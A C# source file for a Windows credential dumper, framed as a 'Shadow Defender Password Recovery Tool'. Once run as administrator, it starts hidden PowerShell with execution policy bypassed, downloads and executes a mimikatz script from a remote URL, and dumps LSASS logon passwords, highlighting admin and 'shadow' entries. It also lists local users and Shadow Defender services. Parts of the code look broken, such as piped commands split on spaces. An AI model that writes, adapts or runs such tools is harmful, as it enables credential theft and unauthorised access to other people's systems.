using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

class CredDumper {
    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    const uint TOKEN_QUERY = 0x0008;
    const uint PROCESS_VM_OPERATION = 0x0008;
    const uint PROCESS_VM_READ = 0x0010;

    static void Main() {
        Console.Clear();
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("=== Shadow Defender Password Recovery Tool ===\n");

        if (!IsRunAsAdmin()) {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("ERROR: Must run as Administrator!");
            Console.WriteLine("Right-click -> 'Run as administrator'");
            Console.ReadKey();
            return;
        }

        Console.ForegroundColor = ConsoleColor.Yellow;
        Console.WriteLine("[+] Running as Administrator - OK\n");

        try {
            // LIVE MIMIKATZ OUTPUT - PASSWORDS SHOW HERE
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("=== MIMIKATZ LSASS DUMP (Live) ===");
            Console.ForegroundColor = ConsoleColor.White;
            RunMimikatzLive();  // SHOWS PASSWORDS IMMEDIATELY

            Console.WriteLine("\n=== LOCAL USERS ===");
            Console.ForegroundColor = ConsoleColor.Yellow;
            GetLocalUsersLive();

            Console.WriteLine("\n=== SHADOW DEFENDER SERVICES ===");
            Console.ForegroundColor = ConsoleColor.Magenta;
            GetShadowServicesLive();

            // HIGHLIGHT SHADOW DEFENDER PASSWORDS
            HighlightShadowPasswords();

        } catch (Exception ex) {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"[-] Error: {ex.Message}");
        }

        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("\n[+] PASSWORD DUMP COMPLETE!");
        Console.WriteLine("[+] Look for RED highlighted Shadow Defender/Admin passwords above");
        Console.WriteLine("\nPress any key to exit...");
        Console.ReadKey();
    }

    static bool IsRunAsAdmin() {
        WindowsIdentity identity = WindowsIdentity.GetCurrent();
        WindowsPrincipal principal = new WindowsPrincipal(identity);
        return principal.IsInRole(WindowsBuiltInRole.Administrator);
    }

    // LIVE MIMIKATZ - PASSWORDS PRINT DIRECTLY TO CONSOLE
    static void RunMimikatzLive() {
        string psCommand = @"
            $ErrorActionPreference = 'SilentlyContinue';
            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/gentilkiwi/mimikatz/master/mimikatz.ps1');
            Invoke-Mimikatz -Command 'privilege::debug ""sekurlsa::logonpasswords"" exit' | ForEach-Object { $_.ToString() }
        ";

        ProcessStartInfo psi = new ProcessStartInfo {
            FileName = "powershell.exe",
            Arguments = $"-ExecutionPolicy Bypass -NoProfile -Command \"{psCommand}\"",
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process process = Process.Start(psi)) {
            string line;
            while ((line = process.StandardOutput.ReadLine()) != null) {
                if (line.Contains("Password") || line.Contains("shadow") || line.Contains("admin")) {
                    Console.ForegroundColor = ConsoleColor.Red;
                } else if (line.Contains("Username") || line.Contains("Domain")) {
                    Console.ForegroundColor = ConsoleColor.Cyan;
                } else {
                    Console.ForegroundColor = ConsoleColor.Gray;
                }
                Console.WriteLine(line);
            }
            process.WaitForExit();
        }
    }

    // LIVE LOCAL USERS
    static void GetLocalUsersLive() {
        ProcessStartInfo psi = new ProcessStartInfo {
            FileName = "net",
            Arguments = "user",
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process process = Process.Start(psi)) {
            string line;
            while ((line = process.StandardOutput.ReadLine()) != null) {
                Console.WriteLine(line);
            }
        }
    }

    // LIVE SERVICES
    static void GetShadowServicesLive() {
        RunCommandLive("sc query | findstr /i shadow");
        RunCommandLive("sc query type= service state= all | findstr /i shadow");
        RunCommandLive("tasklist | findstr /i shadow");
    }

    static void RunCommandLive(string command) {
        string[] parts = command.Split(' ');
        ProcessStartInfo psi = new ProcessStartInfo {
            FileName = parts[0],
            Arguments = string.Join(" ", parts, 1, parts.Length - 1),
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };

        using (Process process = Process.Start(psi)) {
            string line;
            while ((line = process.StandardOutput.ReadLine()) != null) {
                Console.WriteLine(line);
            }
        }
    }

    // SCAN FOR SHADOW DEFENDER PASSWORDS
    static void HighlightShadowPasswords() {
        Console.ForegroundColor = ConsoleColor.Green;
        Console.WriteLine("\n=== SHADOW DEFENDER PASSWORD SUMMARY ===");
        Console.WriteLine("Checking for:");
        Console.WriteLine("  - ShadowDefender service accounts");
        Console.WriteLine("  - Administrator passwords");
        Console.WriteLine("  - Any 'shadow'/'admin' credentials\n");
        
        // Run enhanced shadow search
        RunCommandLive("wmic service where \"name like '%shadow%'\" get name,pathname");
        Console.WriteLine();
    }
}
